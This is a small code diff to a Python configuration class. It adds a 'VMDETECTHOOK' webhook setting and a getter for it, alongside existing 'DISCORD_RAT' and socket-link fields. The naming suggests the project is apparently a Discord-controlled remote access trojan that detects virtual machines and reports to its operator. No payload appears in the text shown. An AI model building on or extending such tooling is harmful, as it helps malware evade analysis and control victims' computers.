@@ -14,6 +14,7 @@ class Config:
         self.wh_name = self.data['WH_NAME']
         self.discord_rat = self.data['DISCORD_RAT']
         self.discord_rat_socket_link = self.data['DISCORD_RAT_SOCKET_LINK']
+        self.vmdetectwebhook = self.data['VMDETECTHOOK']
         
     def get_webhook(self):
         return self.webhook
@@ -38,3 +39,6 @@ class Config:
     
     def get_discord_rat_link(self):
         return self.discord_rat_socket_link
+
+    def get_vmdetectwebhook(self):
+        return self.vmdetectwebhook
